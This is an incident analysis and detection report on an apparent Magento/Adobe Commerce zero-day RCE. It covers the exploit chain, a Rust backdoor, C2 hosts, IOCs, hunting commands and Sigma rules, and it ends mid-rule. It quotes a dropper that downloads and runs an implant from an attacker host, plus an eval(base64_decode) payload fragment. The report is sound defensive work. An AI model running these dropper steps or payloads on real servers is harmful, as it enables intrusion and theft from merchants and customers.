# Technical Analysis Report: StyleSmuggler — Adobe Commerce / Magento Zero-Day RCE (CVE-2026-75650) (2026-09-08)

<!-- revision: v1.1 2026-09-08 — (1) Sigma IP rule: removed 99.84.67.186 (AWS CloudFront anycast, FP risk), kept 185.157.160.251 + 209.141.43.95; (2) Suricata SID:2200006 rev:2: added content match for token value fced27f6d57702565353ecc11722533b; (3) Snort SID:2100002 msg corrected (dropped "/with_resolved"); (4) defanged all prose IOCs outside detection-rule code blocks -->
Prepared by: Actioner
Classification: TLP:CLEAR
Date: 2026-09-08
Version: 1.1

## Executive Summary

StyleSmuggler (CVE-2026-75650, CVSS 10.0) is a critical, unauthenticated remote code execution vulnerability in Adobe Commerce, Adobe Commerce B2B, and Magento Open Source that was actively exploited in the wild as a zero-day for a minimum of three days before Adobe shipped a fix. Dutch e-commerce security firm Sansec discovered and named the flaw after observing live compromises beginning 4 September 2026, 22:20 UTC, and published its advisory the following day. Adobe released an emergency, priority-1 hotfix (APSB26-146, internal reference VULN-39341) on 7 September 2026 at 20:20 UTC — one day ahead of its regularly scheduled 8 September Patch Tuesday. The vulnerability chains Magento's template filter, an object-injection gadget reachable through `styles[...]`/`generatorClass`/`with_resolved` parameters, and three dependency-injection compiler classes that were never meant to run outside the CLI, ending in an `include()` on an attacker-poisoned log file. Because the trigger is Magento's own "Payment Transaction Failed Reminder" email template renderer, no authentication and no user interaction are required, and the exploit succeeds even when the email never gets delivered. Attackers deployed a ~1.9 MB stripped, statically-linked Rust backdoor across at least three masquerading builds (`[kworker/u:8:0]`, `fc-cache`, `chronyd`) with self-restoring cron persistence and, in one variant, a command-and-control channel disguised as NTP traffic on UDP/123. A second, apparently independent threat actor rode the same entry point to drop a compact, token-gated PHP web shell into the product-image cache directory. Patch level provided no protection — Sansec's first confirmed victim was fully patched through July/August 2026 and still fell within 50 minutes of the first worldwide exploitation. All Adobe Commerce, Commerce B2B, and Magento Open Source installations from 2.4.4 through 2.4.9 (including the August 2026 patch level) are affected; merchants must apply VULN-39341 and rotate every credential the Magento encryption key protects.

## Background: Adobe Commerce / Magento Open Source

Adobe Commerce (formerly Magento Commerce) and Magento Open Source are among the most widely deployed e-commerce platforms globally, collectively running a substantial share of online storefronts and handling customer PII, order data, and — in many deployments — stored payment tokens. The platform's storefront, GraphQL API, and transactional-email subsystem are exposed to the public internet by design on every installation. A remote, unauthenticated code-execution flaw in this platform class gives an attacker a direct path from internet access to full server compromise, with no dependency on stolen credentials, social engineering, or victim interaction — and, as this incident demonstrates, no dependency on the target's patch level either, since the vulnerability was unknown to the vendor at the time of exploitation.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-09-04 22:20 | Sansec observes the first confirmed StyleSmuggler exploitation worldwide |
| 2026-09-04 23:10 | First Disrex-handled store ("Store A") compromised, ~50 minutes after the first worldwide exploitation |
| 2026-09-04 23:14 | Store A's Sansec Shield WAF blocks an unrelated `.env` scan (confirming the WAF was active but not yet StyleSmuggler-aware) |
| 2026-09-05 00:55 | A second store is reported compromised (industry reporting; distinct from Disrex's "Store B" below) |
| 2026-09-05 07:15 | Sansec Shield's first StyleSmuggler-specific blocking rules go live |
| 2026-09-05 ~11:00 | Second Disrex-handled store ("Store B") compromised |
| 2026-09-05 13:10 | A merchant receives a garbled "Reminder: failed payment transaction" email full of unresolved `{{var}}`/`{{depend}}` template tags — the earliest human-visible sign of exploitation |
| 2026-09-05 13:51 | Store B compromise confirmed by incident responders |
| 2026-09-05 ~14:20 | Both Disrex-handled stores contained |
| 2026-09-05 15:08 | Store A targeted again; blocked at the web-server layer by newly deployed mitigation rules |
| 2026-09-05 (day) | Sansec publishes its advisory naming the flaw "StyleSmuggler"; Disrex Group publishes an emergency mitigation repository |
| 2026-09-05 17:08 | Store A targeted a third time with a changed trigger-header format (`X-<12hex>` instead of `X-TRACE-<10hex>`); blocked |
| 2026-09-06 | A second implant build appears, masquerading as `fc-cache` (fontconfig cache builder) instead of `[kworker/u:8:0]`, introducing a fake-NTP UDP/123 C2 channel and a new download host, `209.141.43[.]95` |
| 2026-09-07 | A third implant build appears, masquerading as `chronyd` (NTP daemon); Adobe releases APSB26-146 / VULN-39341 at 20:20 UTC, one day ahead of its regular Patch Tuesday |
| 2026-09-08 | Adobe's regularly scheduled September security-bulletin date; this report produced |

## Root Cause: Unauthenticated Object Injection Into Magento's Template Filter → DI-Compiler `include()`

The vulnerability is a chain of two ordinary Magento features stacked to reach an unsafe sink:

1. **Entry point.** Attacker-controlled text reaches Magento's transactional-email template filter without authentication. The filter is the same code path that renders every legitimate order/payment email, so it cannot be feature-flagged off without breaking mail. Sansec's 6 September update identified the concrete trigger: the attack deliberately fires Magento's standard "Payment Transaction Failed Reminder" email, and the malicious code runs *while Magento renders that email* — nobody has to open it, and the attack still succeeds if delivery fails outright. In `Magento\Email\Model\AbstractTemplate::getProcessedTemplate()`, `$processor->filter($this->getTemplateText())` runs a `{{block ...}}` directive supplied by the attacker, and `getTemplateStyles()` feeds an object-injection gadget via the `styles[...]` parameters.
2. **The gadget chain.** A `{{block class=...}}` directive instructs Magento's template filter to instantiate an attacker-named class and invoke methods on it. The `styles[generatorClass]` and `styles[with_resolved][...]` parameters drive which class is built and which method is called, walking the request from the template filter into Magento's dependency-injection (DI) compiler — code that exists solely to serve `bin/magento setup:di:compile` on the command line and was never intended to run during an HTTP request.
3. **The sink.** The chain terminates in `Magento\Setup\Module\Di\Code\Scanner\ArrayScanner::collectEntities()` (and two sibling classes, `XmlInterceptorScanner::_handleControllerClassName()` and `ClassesScanner::includeClass()`), each of which performs `include $file` on a caller-supplied path. `include` parses and executes PHP; it does not just read the file.
4. **The poison.** Immediately before triggering the sink, the attacker plants PHP inside a file Magento is guaranteed to write verbatim: an invalid store code (logged into `var/log/system.log`) or an uncaught-exception failure report (`var/report/<hash>`). Both are ordinary error-logging behavior and are not filterable without breaking legitimate error handling.
5. **Execution.** The poisoned log is `include`d, the embedded PHP executes, and a dropper probes `shell_exec → exec → system → passthru → proc_open → popen` in order, using the first exec primitive that is not disabled, to download and launch the implant.

Adobe's APSB26-146 patch closes the entry, not just the sink: it stops Magento from instantiating an attacker-named class before its type is checked (in `BlockFactory` and the grid-row `UrlGeneratorFactory`) and rejects non-string template-style values, so the object-injection gadget never reaches the `include()` sink at all.

## Technical Analysis of the Malicious Payload

### 1. Injection and Trigger

The attacker sends a crafted request (Sansec withheld the exact assembled request at disclosure, and independent researchers have honored that restraint) that poisons `var/log/system.log` or `var/report/<hash>` with PHP, then triggers Magento's "Payment Transaction Failed Reminder" email-rendering path. Requests observed in the wild carried the object-injection parameters in the URL query string against `/graphql`, using a scripting HTTP client (`python-requests 2.15.0` in the first wave, `python-requests/2.32.4` in the second) rather than a browser. One captured variant instead placed its entire payload — a raw PHP open tag — inside the **User-Agent header** of an otherwise completely ordinary `GET /customer/section/load/?sections=customer&force_new_section_timestamp=true` request, so the request line itself gave no indication of attack.

A distinctive **trigger header** accompanies exploitation, regenerated per request and therefore useless as a literal-value indicator, but consistent in shape: `X-TRACE-<10 hex>` on the morning of 5 September, shifting to `X-<12 hex>` (dropping "TRACE" entirely) that same afternoon. A response/log marker, `MG<20 hex>::<base64 result>::/MG<20 hex>`, is direct proof the payload executed, not merely that it was sent.

### 2. Dropper and Implant Delivery

On successful `include()`, the executed PHP is a minimal dropper that walks six exec primitives in order (`shell_exec`, `exec`, `system`, `passthru`, `proc_open`, `popen`) and uses the first one available, then downloads an architecture-matched implant:

```
curl/wget hxxps://247.cdnflare[.]xyz/files/kworker-linux-<arch>
chmod 755 /tmp/.kw_<random>
nohup /tmp/.kw_<random> &
```

Notably, on one compromised store the first four exec functions were disabled but `proc_open` was not, and the dropper succeeded anyway — `open_basedir` provided no protection because a child process spawned via `proc_open` runs entirely outside PHP's own sandboxing once it starts. Because Magento's default mail transport (Symfony Mailer's `SendmailTransport`) also depends on `proc_open`, defenders cannot blanket-disable it without first moving mail to a socket-based SMTP transport.

### 3. C2 Infrastructure

| Build | Channel | Details |
|---|---|---|
| `[kworker/u:8:0]` (original, 4–5 Sep) | None observed / internal Redis | On one infected store the implant made **zero external network connections**, instead reading its instructions from the store's own Redis (`127.0.0.1:6379`, 28 connections observed). Sansec's advisory separately documents a WebSocket-over-TLS channel to `99.84.67[.]186:443` and a remote-shell channel to `windwsecurity[.]run:443` for this family. |
| `fc-cache` (v2.1.4, from 6 Sep) | Fake-NTP over UDP/123 | Every 60 seconds, sends 48-byte UDP datagrams to a `ntp.*`-named host on port 123. Only the first four bytes are genuine NTP; the remainder is a MessagePack record carrying agent ID, hostname, username, OS, memory/disk usage, uptime, root-or-not status, implant version, and public IP. Marks packets as NTPv4 **server** mode — legitimate NTP clients never do this — and sends **nine** 48-byte datagrams per cycle where a real client sends one. Before beaconing, it learns the host's public IP via plain HTTP from `api4.ipify.org`, `ipv4.icanhazip.com`, `ipv4.ident.me`, and `ipinfo.io`, using a User-Agent truncated after `AppleWebKit/537.36` (matching no real browser). It also reads `TracerPid` from `/proc/self/status`; under a debugger it installs but never beacons. |
| `chronyd` (v2.1.5, from 7 Sep) | Fake-NTP over UDP/123 | Same channel design as `fc-cache`, renamed again; parent PID 1 (init) observed on some hosts. |

C2 domain `ntp.timesync[.]to` (and sibling `ntp.timesysnc[.]net`) resolved to `185.157.160[.]251` as of 7 September. Additional fallback fake-NTP hosts: `time.microsft[.]run`, `pool.microsft[.]studio`, `ntp.synctime[.]to`, `ntp.syncstime[.]to` — all deliberate typosquats of legitimate-sounding services. **Absence of any of this traffic on a given host does not indicate a clean host**: two 200MB+ packet captures taken from live infections contained none of it.

### 4. Platform-Specific Behavior

StyleSmuggler and its payloads are Linux/PHP-specific — the implant is compiled for x86-64 and arm64 Linux only, and no Windows variant has been reported. The vulnerability itself is platform-agnostic within Magento/Commerce (affects any OS running the PHP application), but all observed payload delivery targeted Linux hosting environments, which represent the overwhelming majority of production Magento/Commerce deployments.

### 5. Anti-Forensics / Evasion Techniques

- **Process masquerading.** The implant sets its `argv`/cmdline to the literal string `[kworker/u:8:0]` to impersonate a genuine kernel worker thread. Genuine kernel threads are always root-owned with **no resident memory** and an **empty** `comm` field (the brackets are added by `ps` itself, not present in `comm`) — a bracketed name with real RSS, owned by a non-root/site user, is the tell. A detection written against `comm` instead of the full `args`/cmdline matches nothing.
- **Cron persistence that hides from syslog.** The `*/5 * * * *` (or `13,43 * * * *` / `57,27 * * * *`) persistence entry is written **directly to `/var/spool/cron/crontabs/<user>`** rather than through the `crontab` binary, so syslog never records a `REPLACE` event. One infected store carried the identical line **1,728 times**, re-appended within a second of manual removal.
- **Filesystem location chosen to evade scanners.** The implant installs to `~/.local/share/.gvfsd/` or `~/.cache/fontconfig/` — one level above the document root that most Magento malware scanners are scoped to. On one store, a commercial scanner (eComscan) ran with background-process and scheduled-task checks enabled while the implant was live and 1,728 malicious cron lines were present, and reported the store clean.
- **In-memory patching.** On one host, the binary running in memory (`/proc/<pid>/exe`, pointing at a deleted inode) hashed differently from the copy sitting on disk — the operator updates the implant in place. Defenders must hash the running process, not only the file.
- **Log poisoning leaves a forensic tell either way.** `include` on a file with no `return` statement returns `int(1)`; the next line's `array_merge($output, $data)` then throws a `TypeError`, which is evidence the exploit **succeeded**, not failed. A stealthier variant appends `return [];` to the poisoned payload specifically to suppress this tell.
- **Dual poisoning locations.** Variants differ in whether they poison `var/log/system.log` or `var/report/<hash>` — Sansec's own published check looks only at `var/report/`, and would have missed both stores Disrex handled, which were poisoned through `system.log`.

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`, `c2[.]attacker[.]net`)
> - IP addresses: `[.]` replacing dots (e.g., `1.2.3[.]4`, `192.168[.]1[.]100`)
>
> Detection rules in the Detection Rules section below use the **real, non-defanged** values — defanged values never fire in a live rule.

### Package / Software Level

| Package / Component | Vulnerable Versions | Description |
|---------------------|---------------------|-------------|
| Adobe Commerce | 2.4.4 through 2.4.9, August 2026 releases (`-2026-aug`) and earlier | Unauthenticated RCE via template-filter object injection into DI-compiler `include()` |
| Adobe Commerce B2B | 1.3.3 through 1.5.3, August 2026 releases and earlier | Same vulnerability via shared template/session code |
| Magento Open Source | 2.4.4 through 2.4.9 (reproduced by Sansec on clean 2.4.7, 2.4.8, 2.4.9), August 2026 releases and earlier | Same vulnerability; first confirmed victim ran 2.4.6-p15 fully patched through July/August 2026 |
| Fix | `VULN-39341-composer-patches.zip` via `repo.magento[.]com`, shipped as APSB26-146 | Hotfix; not a full point release |

### File System

| Platform | Path | Hash (SHA256) | Description |
|----------|------|---------------|-------------|
| Linux | `~/.local/share/.gvfsd/gvfsd-user` | `e315687a1dfe61ef4a5a5642214db6d3b2b05d81391285eebc2af664641a26a7` (Sansec sample); `8334b434fa3fe9f59cebe9609b11e0b1fd19d10212c45c705adec1902a1d06ef` (on-disk, both Disrex-handled stores); `251fabd50d7b18a8b5e1b3ef5d64e7198c17244778f6461fb1ab07f6169bf220` (in-memory, one store — differs from on-disk copy) | Original `kworker` implant build (4–5 Sep) |
| Linux | `~/.local/share/.gvfsd/.gvfsd_<8hex>.lock`, `/tmp/.gvfsd_<8hex>.lock`, `/tmp/.kw_<random><random>` | — | PID lock files and secondary staging path for `kworker` build |
| Linux | `~/.cache/fontconfig/fc-cache`, `/tmp/.fc-<8hex>/fc-cache`, `/tmp/fc-cache`, `/tmp/.cache_<random><random>`, `/tmp/.fc_<8hex>.lock` | `4352cabaa451e5a894535fbcc4d46628701303322a13745cb5479d7d0534ae8e` (x86-64); `d2fbf9eb75c495bfea48790d3b228fab0c15a282419c3d3f5e49294c4e1a3e82` (arm64); `b79dfdc1eed860e0b76c629d6adfce251db379b0b45a6d728d4ef483f7551420` | `fc-cache`-masquerading build (from 6 Sep), implant version 2.1.4 |
| Linux | `/tmp/.chrony-<8hex>/chronyd` | `1a3374ffac5b0a62467612f264c49792d206304d4514409c982325c91231375d` | `chronyd`-masquerading build (from 7 Sep), implant version 2.1.5 |
| Linux (PHP) | `pub/media/catalog/product/cache/ss_<10hex>/sync_<10hex>.php` | `d61217ca0bca83204302fa7b41935ce36f73764559c156d5c980f2fedddffb6e` (485 bytes) | Secondary-actor PHP web shell; returns HTTP 404 unless header `X-Cache-Token: fced27f6d57702565353ecc11722533b` is present, then executes PHP from a POST `task` parameter |
| Linux | `var/log/system.log`, `var/report/<hash>` | — | Poisoned Magento log/report files used as the `include()` payload source |
| Linux | `/var/spool/cron/crontabs/<user>` | — | Cron persistence written directly to the spool file, bypassing the `crontab` command and syslog |

### Network

| Type | Value | Context |
|------|-------|---------|
| URL | `hxxps://247.cdnflare[.]xyz/files/kworker-linux-<arch>` | `kworker` build implant download (resolves to `2a06:98c1:3120::2`, `2a06:98c1:3121::2`) |
| URL | `hxxp://209.141.43[.]95/files/` | `fc-cache` build implant download (FranTech AS53667) |
| Domain/Port | `99.84.67[.]186:443` | Primary C2, WebSocket over TLS (`kworker` build; per Sansec advisory) |
| Domain/Port | `windwsecurity[.]run:443` | Remote-shell C2, WebSocket over TLS |
| Domain/Port | `ntp.timesync[.]to:123`, `ntp.timesysnc[.]net:123` | Fake-NTP C2 (`fc-cache`/`chronyd` builds); both resolved to `185.157.160[.]251` as of 7 Sep |
| Domain/Port | `time.microsft[.]run:123`, `pool.microsft[.]studio:123`, `ntp.synctime[.]to:123`, `ntp.syncstime[.]to:123` | Fallback fake-NTP C2 hosts (typosquats of legitimate service names) |
| IP | `185.157.160[.]251:123` | Resolved IP for the fake-NTP C2 domains |
| OAST domain | `457cfa2fb7p5.daf892t5qau4og8pi4cghbc6fhm1dim3u[.]oast[.]site` | Second-actor web-shell dropper deployment callback |
| OAST domain (pattern) | `457cfa2fb7d<n>-<chunk>.daf892t5qau4og8pi4cghbc6fhm1dim3u[.]oast[.]site` | Reconnaissance-probe DNS exfiltration channel; each label is a 50-character chunk of harvested host data |
| Source IP | `88.216.72[.]181` | Attacker source (Sansec-published), 45 requests observed |
| Source IP | `5.181.86[.]133` | Attacker source (CloudVPS), 96 requests against one store |
| Source IP | `91.238.181[.]19` | Second-wave attacker source (AS49434), 48 exploit requests, 17:08 CEST 5 Sep |
| Source IP | `76.31.99[.]207`, `209.73.130[.]148`, `77.239.124[.]107`, `182.182.152[.]48` | Additional attacker-source IPs (secondary reporting) |

> **Caveat on source IPs:** Disrex recorded **27 distinct source addresses across two waves** on just three stores — blocking the single IP in Sansec's advisory (`88.216.72[.]181`) alone stops less than a quarter of observed traffic. A subset of sources are consumer/residential ISP addresses consistent with a rented or compromised residential-proxy pool; **do not blanket-block these** — they are proxy exits, not attacker-owned infrastructure, and blocking them risks legitimate customer traffic. Correlate against your own logs instead.

### Behavioral

- **Trigger header**, regenerated per request — match the shape, not the literal value: `X-TRACE-<10 hex>` (morning of 5 Sep) or `X-<12 hex>` with no `TRACE` (afternoon of 5 Sep onward), e.g. `X-TRACE-1713CB9C2F`, `X-52988DAECE51`.
- **Response/log proof-of-execution marker**: `MG<20 hex>::<base64 result>::/MG<20 hex>`, e.g. `MG8a5ee8fd94fdb9fc6b50::...::/MG8a5ee8fd94fdb9fc6b50`.
- **Attacker User-Agent** on exploit requests: `python-requests 2.15.0` (note the space, not a slash — first wave) or `python-requests/2.32.4` (second wave). Never a browser UA.
- **Early-warning email**: a garbled "Reminder: failed payment transaction" notification containing raw, unresolved `{{var ...}}`/`{{depend ...}}`/`{{if ...}}` template tags, Magento's own "Er is een fout opgetreden bij het genereren van deze content" ("an error occurred generating this content") fallback string embedded mid-address, a customer email address ending in `.invalid` with a long hex local part, and a zero-value, item-less order total.
- **`crontab command not allowed` messages** in PHP/system logs (web-service user context, e.g. `www-data`) — an artifact of the exec-primitive probing sequence hitting a hardened environment.
- **Process indicators**: `ps -eo pid,user,rss,args` showing a bracketed name (e.g. `[kworker/u:8:0]`) owned by a non-root user with nonzero RSS; or `fc-cache`/`chronyd` running from a non-root uid and a non-system path.
- **Repeated identical crontab lines** (observed up to 1,728 duplicate entries on one host) that reappear within seconds of manual removal.

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1190 | Exploit Public-Facing Application | Unauthenticated object-injection chain through Magento's template filter, reachable via the storefront/GraphQL surface with no auth or user interaction |
| T1140 | Deobfuscate/Decode Files or Information | Observed payload `POST /paypal/transparent/response/?<?=eval(base64_decode('...'))` |
| T1105 | Ingress Tool Transfer | Dropper `curl`/`wget`s the architecture-matched Rust implant from `247.cdnflare[.]xyz` / `209.141.43[.]95` after code execution |
| T1036.005 | Masquerading: Match Legitimate Name or Location | Implant sets cmdline to `[kworker/u:8:0]` and later renames to `fc-cache`/`chronyd`, relocating into per-user cache directories that mimic legitimate GVFS/fontconfig/chrony paths |
| T1564.001 | Hide Artifacts: Hidden Files or Directories | All persistence and staging paths use dot-prefixed hidden files/directories (`.gvfsd`, `.kw_`, `.fc_`, `.fc-`, `.chrony-`, `.cache_`) |
| T1053.003 | Scheduled Task/Job: Cron | Persistence entry written directly to `/var/spool/cron/crontabs/<user>`, bypassing the `crontab` binary and syslog auditing |
| T1001.003 | Data Obfuscation: Protocol or Service Impersonation | `fc-cache`/`chronyd` builds disguise C2 beacons as NTPv4 server-mode UDP/123 replies carrying a MessagePack payload |
| T1071.001 | Application Layer Protocol: Web Protocols | WebSocket-over-TLS C2 and remote-shell channels to `99.84.67[.]186:443` and `windwsecurity[.]run:443` |
| T1505.003 | Server Software Component: Web Shell | Independent second actor drops a token-gated PHP web shell into `pub/media/catalog/product/cache/` via the same entry point |
| T1082 | System Information Discovery | Recon probe (GraphQL query with a payload in the `Store:` header) harvests kernel/OS string, PHP process user, working directory, and `pub/media` writability |
| T1048.003 | Exfiltration Over Alternative Protocol | Reconnaissance data chunked into 50-character labels and exfiltrated via DNS queries to an attacker-controlled OAST domain |

## Impact Assessment

**Breadth:** Adobe Commerce and Magento Open Source collectively power a very large share of global e-commerce, and every supported version (2.4.4 through 2.4.9, all editions) was vulnerable at disclosure. Sansec confirmed the chain reproduces on clean, fully-patched (July/August 2026) installations, meaning the entire installed base — not a subset behind an older patch level — was exposed.

**Depth:** Maximum. This is unauthenticated remote code execution (CVSS 10.0) leading to a persistent backdoor with, in the worst observed case, full shell access via `proc_open` even when five of six exec primitives were disabled. Successful exploitation gives an attacker everything the web-application user can read, including database credentials, payment-gateway API keys, and the Magento encryption key protecting stored data.

**Stealth:** High. The implant evades document-root-scoped malware scanners, evades syslog-based cron auditing, evades `comm`-based process checks, and — in the Redis-only and possibly other variants — generates no anomalous outbound network traffic at all. One commercial scanner reported a live-implant host as clean.

**Exploitation velocity:** This was a true zero-day — mass exploitation began at least three days before any vendor fix existed, and the observed victims include fully-patched installations. No patch level and no pre-existing signature could have prevented the initial compromise window (04 Sep 22:20 UTC – 07 Sep 20:20 UTC); only the vulnerability-independent layers (`disable_functions`, `noexec` on `/tmp`) and rapid IOC-based hunting reduced dwell time for early victims.

## Detection & Remediation

### Immediate Detection

Run these read-only checks before applying any mitigation — an infected host gains nothing from blocking rules, since the implant is already resident and self-restoring:

```bash
# Masquerading process — the sharpest single signal. Match on args/cmdline, NOT comm:
# genuine kernel threads are always root-owned with an empty comm field.
ps -eo pid,user,rss,args --no-headers | awk '$4 ~ /^\[/ && $2 != "root"'
ps -eo pid,comm,args | grep -iE 'kworker|fc-cache|chronyd' | grep -v ' root '

# Persistence artifacts and cron entries
crontab -l | grep -iE 'gvfsd|fontconfig/fc-cache'
ls -la ~/.local/share/.gvfsd/ /tmp/.kw_* /tmp/.gvfsd_* /tmp/.fc-* /tmp/.fc_* /tmp/.chrony-* /tmp/.cache_* 2>/dev/null

# Poisoned log/report files — check BOTH locations, variants differ
grep -rl 'X_TRACE_\|<?php' var/report/ var/log/ 2>/dev/null

# Access-log evidence of exploitation attempts
grep -acE 'styles(\[|%5B)|generatorClass|with_resolved|cdnflare' /path/to/access.log

# Secondary PHP web shell
find pub/media -name '*.php'

# Across every account on a shared host, as root
find /home /root /tmp /var/tmp /dev/shm \
  \( -name 'gvfsd-user' -o -name '.gvfsd_*.lock' -o -name '.kw_*' -o -name 'fc-cache' \) 2>/dev/null

# Hash the RUNNING process, not just the on-disk file — the implant updates in place
cp /proc/<pid>/exe /tmp/sample.bin && sha256sum /tmp/sample.bin

# Check patch status
vendor/bin/magento-patches -n status | grep -i "39341\|status"
```

**If any of the above returns a hit: stop.** Do not apply web-server mitigation rules yet, and do not reboot — `/proc/<pid>/exe` is frequently the only surviving copy of a binary the attacker deleted from disk, killing the process before removing the cron entry causes instant re-infection, and `composer install` overwrites timestamps that prove what was touched. Preserve evidence, remove persistence before killing processes, hunt every account on shared hosting, and rotate every credential the site user could read.

### Remediation

1. **Apply APSB26-146 immediately.** Download `VULN-39341-composer-patches.zip` from `repo.magento.com` and apply via `cweagans/composer-patches`, or use the community-repackaged `disrex/stylesmuggler-adobe-patches` (Magento Open Source) / `disrex/stylesmuggler-adobe-patches-mageos` (Mage-OS) composer packages, which auto-select the correct patch for the installed version.
2. **If you cannot patch immediately**, deploy the interim web-server rules in the Detection Rules section below (query-string pattern matching — bypassable by moving parameters into a POST body, but free and stops the current campaign) and, where feasible, make the three DI-compiler scanner classes CLI-only (see `disrex-group/stylesmuggler-mitigation` §3) — this control sits on the sink itself and cannot be bypassed by request-shape tricks.
3. **Rotate every credential the Magento encryption key protects, at the source, not just within Commerce**: admin passwords, REST/SOAP/GraphQL integration tokens, OAuth client secrets, payment-gateway API credentials, database credentials, SSH/deploy keys, and third-party extension API keys. **Rotating the encryption key alone does not invalidate data an attacker already read.**
4. **Hunt for both implant families and the secondary web shell** using the Immediate Detection commands above before assuming a patched host is clean — patching stops *future* exploitation, not an implant already resident.
5. **Move mail off `SendmailTransport` to a socket-based SMTP transport**, then add `shell_exec`, `exec`, `system`, `passthru`, and `popen` to `disable_functions`; only close `proc_open` after confirming mail still sends via SMTP.
6. **Enable `noexec` on `/tmp`, `/var/tmp`, and `/dev/shm`** as defense-in-depth against the dropper's write-then-execute pattern — no longer load-bearing once patched, but still worth keeping.
7. **If evidence of compromise is found**, treat as a full compromise: isolate, preserve forensics (do not reboot), search every account on shared hosts, and decide honestly between clean-and-verify versus full rebuild.

### Long-Term Hardening

- Subscribe to Adobe security bulletin notifications and build a same-day patch-application capability for Commerce/Magento — this incident's entire exploitation window (three days of zero-day activity) closed only when the vendor fix shipped.
- Scope malware/webshell scanners beyond the document root — this implant deliberately hid one directory level above it in `~/.local/share/` and `~/.cache/`.
- Monitor both `var/log/system.log` and `var/report/` for raw, unrendered PHP — treat either as a critical alert, not routine log noise.
- Treat garbled transactional emails containing unresolved `{{var}}`/`{{depend}}` tags as a security signal, not a broken-integration nuisance — it was the fastest early-warning indicator observed in this incident.
- Maintain a WAF or virtual-patching capability (e.g. Sansec Shield) capable of shipping new rules within hours of a zero-day disclosure; both Disrex-handled stores were breached in the eight-hour window before any defense — of any kind — existed anywhere.
- Periodically audit `disable_functions` coverage against Magento's actual `proc_open` dependency (mail transport) so the exec-primitive hardening in this report's remediation section can be applied without breaking transactional mail.

## Detection Rules

The following 22 rules (9 Sigma, 2 YARA, 5 Snort, 6 Suricata) were built from the concrete, cross-verified artifacts above — this is a well-instrumented zero-day with a primary vendor-adjacent forensic writeup (Sansec, Disrex Group), so the viability gate is comfortably passed. All rules validated clean against their respective tooling (`sigma check`/`sigma convert`, `yarac`, `snort -T`, `suricata -T`) on the first attempt. The one caveat that matters across the set: C2 domains, IPs, and the OAST callback domain are single-campaign infrastructure that will rotate — treat those specific rules as high-confidence but time-limited, and prioritize the webserver/host-based behavioral rules for durable coverage.

### Sigma

StyleSmuggler exploitation traffic still carries the object-injection gadget parameters in the URL query string in every observed sample.
✅ Compiles (sigma check + splunk + log_scale) — Confidence: high

```yaml
title: StyleSmuggler Magento Object-Injection Gadget Parameters in Web Request
id: 2b149fef-5966-4b7a-9e9d-6f76b2ecfac8
status: experimental
description: >
    Detects HTTP requests carrying the query-string parameters observed in
    active StyleSmuggler (CVE-2026-75650) exploitation against Adobe Commerce
    and Magento Open Source: the "styles[" object-injection gadget parameter,
    the "generatorClass"/"with_resolved" driver parameters used to walk the
    dependency-injection compiler, raw {{block/config/trans/var/depend}}
    template directives smuggled through the URI, and raw PHP open tags.
    Matches both literal and URL-encoded forms, since observed payloads
    arrived percent-encoded (e.g. styles%5Bfirst%5D).
references:
    - https://sansec.io/research/stylesmuggler-0day
    - https://github.com/disrex-group/stylesmuggler-mitigation
    - https://thehackernews.com/2026/09/unpatched-magento-and-adobe-commerce.html
author: Actioner
date: 2026/09/08
tags:
    - attack.t1190
logsource:
    category: webserver
detection:
    selection_gadget:
        cs-uri-query|contains:
            - 'styles['
            - 'styles%5B'
    selection_driver:
        cs-uri-query|contains:
            - 'generatorClass'
            - 'with_resolved'
    selection_template:
        cs-uri-query|re: '(\{\{|%7B%7B)\s*(block|config|trans|var|depend)'
    selection_phptag:
        cs-uri-query|contains:
            - '<?'
            - '%3C%3F'
    condition: 1 of selection_*
falsepositives:
    - A storefront search for the literal text "styles[" or "{{block" is theoretically
      possible but was not observed by any source and is extremely unlikely on a
      real Magento/Commerce storefront.
level: critical
```

One captured StyleSmuggler variant carried its payload entirely inside the User-Agent header, aimed at a pre-poisoned log, leaving the request line itself unremarkable.
✅ Compiles (sigma check + splunk + log_scale) — Confidence: high

```yaml
title: PHP Open Tag Smuggled in User-Agent Header (StyleSmuggler Variant)
id: 1d101841-6040-4ef2-82f7-9730cdd96057
status: experimental
description: >
    Detects a raw PHP open tag inside the HTTP User-Agent header. One observed
    StyleSmuggler (CVE-2026-75650) variant carried its entire exploitation
    payload in the User-Agent rather than the URI, aimed at a Magento log file
    the attacker had poisoned moments earlier — a technique that leaves the
    request line itself looking completely ordinary (e.g. a routine
    /customer/section/load call).
references:
    - https://sansec.io/research/stylesmuggler-0day
    - https://github.com/disrex-group/stylesmuggler-mitigation
author: Actioner
date: 2026/09/08
tags:
    - attack.t1190
    - attack.t1140
logsource:
    category: webserver
detection:
    selection:
        cs-user-agent|contains:
            - '<?php'
            - '<?='
    condition: selection
falsepositives:
    - Extremely rare; no legitimate browser or API client places a PHP open tag
      in its User-Agent string.
level: high
```

A second, independent threat actor dropped a hash-named PHP web shell into the product-image cache directory via the same entry point.
✅ Compiles (sigma check + splunk + log_scale) — Confidence: high

```yaml
title: StyleSmuggler Secondary PHP Web Shell Path Accessed
id: baff9bac-6b13-4415-bfcf-6b14a13d8451
status: experimental
description: >
    Detects requests to the hash-named PHP web shell dropped into the product-image
    cache directory by a second, apparently independent threat actor riding the
    StyleSmuggler (CVE-2026-75650) entry point. The shell lives under
    pub/media/catalog/product/cache/ss_<10 hex>/sync_<10 hex>.php, returns a
    plain 404 unless the correct X-Cache-Token header is supplied, and executes
    PHP supplied in a POST "task" parameter once activated.
references:
    - https://securityaffairs.com/198603/uncategorized/stylesmuggler-the-magento-zero-day-behind-new-store-attacks.html
    - https://sansec.io/research/stylesmuggler-0day
author: Actioner
date: 2026/09/08
tags:
    - attack.t1505.003
logsource:
    category: webserver
detection:
    selection:
        cs-method: 'POST'
        cs-uri-stem|re: 'pub/media/catalog/product/cache/ss_[0-9a-f]{10}/sync_[0-9a-f]{10}\.php'
    condition: selection
falsepositives:
    - None expected; this exact hash-named path pattern under the product-image
      cache directory is not part of stock Magento/Adobe Commerce.
level: critical
```

The Rust implant, across all three masquerading builds, writes to a small, consistent set of non-standard filesystem locations.
✅ Compiles (sigma check + splunk + log_scale) — Confidence: high

```yaml
